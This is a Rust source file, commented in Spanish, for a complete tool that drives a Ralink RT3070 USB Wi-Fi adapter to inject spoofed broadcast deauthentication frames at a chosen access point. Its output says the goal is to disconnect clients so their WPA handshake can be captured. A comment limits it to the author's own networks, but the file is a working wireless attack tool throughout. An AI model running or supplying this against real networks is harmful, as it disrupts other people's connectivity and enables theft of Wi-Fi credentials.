// TX de deauth dirigido por USB crudo (EP 0x01) — mismo formato que tx.rs
// (TXINFO + TXWI + 802.11) pero con frame deauth (subtype 12) al objetivo.
// Uso: rt3070_deauth <BSSID> [canal] [count] [MAC origen (opcional)]
// Requiere rt3070_init previo (firmware + radio ON + canal).
// Lab-only: usar SOLO contra redes propias.
mod common;

use common::*;
use std::process::exit;

fn parse_mac(s: &str) -> [u8; 6] {
    let parts: Vec<u8> = s.split([':', '-']).filter_map(|p| u8::from_str_radix(p, 16).ok()).collect();
    if parts.len() != 6 {
        eprintln!("❌ MAC inválida: {s} (formato AA:BB:CC:DD:EE:FF)");
        exit(2);
    }
    [parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]]
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let bssid = args.get(1).map(|s| s.clone()).unwrap_or_else(|| {
        eprintln!("Uso: rt3070_deauth <BSSID> [canal] [count] [MAC_origen]"); exit(2);
    });
    let bssid = parse_mac(&bssid);
    let chan: u8 = args.get(2).map(|s| s.parse().unwrap_or(11)).unwrap_or(11);
    let count: u32 = args.get(3).map(|s| s.parse().unwrap_or(10)).unwrap_or(10);
    // MAC origen: la nuestra (spoof). Default: DE:AD:BE:EF:13:37
    let src = args.get(4).map(|s| parse_mac(s)).unwrap_or([0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37]);

    let h = open_rt3070().expect("abrir RT3070 (usa rt3070_init antes)");

    // MAC/BSSID del transmisor (direcciones corregidas)
    let dw0: u32 = u32::from_le_bytes(src[0..4].try_into().unwrap());
    let dw1: u32 = 0x0000_0000 | (src[4] as u32) | ((src[5] as u32) << 8);
    reg_write(&h, MAC_ADDR_DW0, dw0).unwrap();
    reg_write(&h, MAC_ADDR_DW1, dw1).unwrap();
    reg_write(&h, MAC_BSSID_DW0, dw0).unwrap();
    reg_write(&h, MAC_BSSID_DW1, dw1).unwrap();

    // Reconfigurar canal (RF real) + PA
    if let Err(e) = config_channel_rt3070(&h, chan) { println!("⚠️ canal: {e:?}"); }
    let _ = enable_tx_pa(&h);

    // Frame deauth: subtype 12 (0xC0), motivo 3 (sending STA is leaving).
    // Deauth del AP a todos sus clientes: DA=broadcast, SA=BSSID, BSSID=BSSID
    let mut f = Vec::new();
    f.extend_from_slice(&[0xC0, 0x00]); // FC: mgmt, subtype 12 (deauth)
    f.extend_from_slice(&[0x00, 0x00]); // duration
    f.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]); // DA = broadcast
    f.extend_from_slice(&bssid); // SA = AP
    f.extend_from_slice(&bssid); // BSSID = AP
    f.extend_from_slice(&[0x00, 0x00]); // seq
    f.extend_from_slice(&[0x03, 0x00]); // reason code 3 (leaving)

    // TXWI real (CCK 1Mbps, len en TXWI_W1, PACKETID=1 → feedback TX_STA_FIFO)
    let txwi = txwi_bytes(f.len() as u16, false, 1);
    let total = (4 + 20 + f.len()) as u16;
    // TXINFO igual que tx.rs: PKT_LEN | WIV | QSEL=2
    let info_w0: u32 = ((total as u32) & 0xFFFF) | (1 << 24) | (2 << 25);
    let mut txinfo = [0u8; 4];
    txinfo[0..4].copy_from_slice(&info_w0.to_le_bytes());

    let mut frame = Vec::new();
    frame.extend_from_slice(&txinfo);
    frame.extend_from_slice(&txwi);
    frame.extend_from_slice(&f);
    while frame.len() % 4 != 0 { frame.push(0); } // USB end pad

    println!("Deauth BSSID={} canal={} x{} (frame {} B, TX {} B)",
        bssid.map(|b| format!("{b:02X}")).join(":"), chan, count, f.len(), frame.len());

    // USB DMA config con campos reales del driver
    let _ = reg_write(&h, USB_DMA_CFG, USB_DMA_CFG_VALUE);
    std::thread::sleep(std::time::Duration::from_millis(10));

    const EP_TX: u8 = 0x01;
    let mut ok = 0;
    for i in 0..count {
        match h.write_bulk(EP_TX, &frame, std::time::Duration::from_millis(1000)) {
            Ok(_) => {
                ok += 1;
                if i < 3 || i % 10 == 0 { println!("  [{i}] deauth enviado ✅"); }
            }
            Err(e) => {
                println!("  [{i}] ERR {e:?}");
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(20)); // ritmo de aire real
    }
    // Feedback real del chip: cada frame con PACKETID≠0 deja TXDONE en la FIFO
    for line in drain_tx_status(&h, 16) {
        println!("  [status] {line}");
    }
    println!("\n{ok}/{count} deauth frames escritos al chip");
    if ok > 0 {
        println!("➡️  Verifica: la captura Npcap (otro driver, otra tarjeta o Kali) debería");
        println!("   mostrar EAPOL: el cliente se reconecta → handshake capturable.");
        println!("   (Las líneas [status] TXDONE success=true confirman TX real)");
    }
}
